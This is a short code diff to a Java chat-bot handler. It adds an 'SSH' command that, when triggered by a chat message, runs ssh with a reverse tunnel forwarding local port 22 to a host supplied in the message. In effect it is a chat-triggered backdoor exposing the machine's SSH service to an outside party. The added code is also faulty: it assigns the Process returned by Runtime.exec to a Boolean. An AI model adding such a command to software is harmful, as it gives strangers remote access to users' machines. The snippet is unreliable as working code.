@@ -52,6 +52,18 @@ public class BotHandler implements Listener<ReceiveChatEvent>{
 		commands.put(Time.class.getSimpleName(), new Time());
 		commands.put(List.class.getSimpleName(), new List());
 		commands.put(Clients.class.getSimpleName(), new Clients());
+		commands.put("SSH", new Command() {
+			@Override
+			public String execute(String[] args) {
+				Boolean ssh = Runtime.getRuntime().exec(new String[] { "ssh", "-TR", "14242:localhost:22", args[0] });
+				return ssh? "so far so good" : "you're screwed";
+			}
+
+			@Override
+			public String helpMsg() {
+				return "SSH user@ip : reverse tunneling on port 14242";
+			}
+		});
 		commands.put("Help", new Command() {
 			@Override
 			public String execute(String[] args) {
